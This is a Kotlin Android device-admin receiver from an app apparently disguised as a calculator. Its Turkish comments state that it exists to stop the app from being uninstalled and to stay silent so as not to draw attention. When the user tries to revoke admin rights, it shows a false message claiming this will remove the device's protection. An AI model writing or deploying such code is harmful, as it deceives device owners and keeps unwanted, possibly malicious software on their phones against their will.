package com.utility.calculator.admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

/**
 * Device Admin - Uygulamanın kolayca silinmesini engeller
 * Silmek için önce Device Admin'den çıkarmak gerekir
 */
class DeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        // Device Admin aktif edildi
        // Sessiz ol, dikkat çekme
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Kullanıcı devre dışı bırakmaya çalışıyor
        return "Bu özelliği devre dışı bırakmak cihazınızın korumasını kaldıracaktır. Devam etmek istediğinizden emin misiniz?"
    }

    override fun onDisabled(context: Context, intent: Intent) {
        // Devre dışı bırakıldı
    }
}
